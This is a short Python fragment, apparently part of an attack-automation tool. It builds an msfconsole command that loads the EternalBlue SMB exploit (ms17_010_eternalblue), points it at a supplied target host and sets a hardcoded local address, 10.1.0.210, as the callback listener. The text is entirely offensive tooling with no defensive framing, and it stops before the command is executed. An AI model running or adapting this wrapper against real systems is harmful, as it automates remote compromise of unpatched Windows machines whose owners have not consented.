
exploits = {
    'eternalblue': 'exploit/windows/smb/ms17_010_eternalblue'
    }

class Metasploit:
    def __init__(self, rhost, lhost, args):
        self.module = 'msfconsole'
        self.rhost = rhost
        self.lhost = '10.1.0.210'
        self.args = args

    def build_attack(self):
        exploit = exploits[self.args.get('exploit', 'eternalblue')]
        attack = f'{self.module} -q -x \"use {exploit}; set RHOSTS {self.rhost}; set LHOST {self.lhost}; exploit\"'
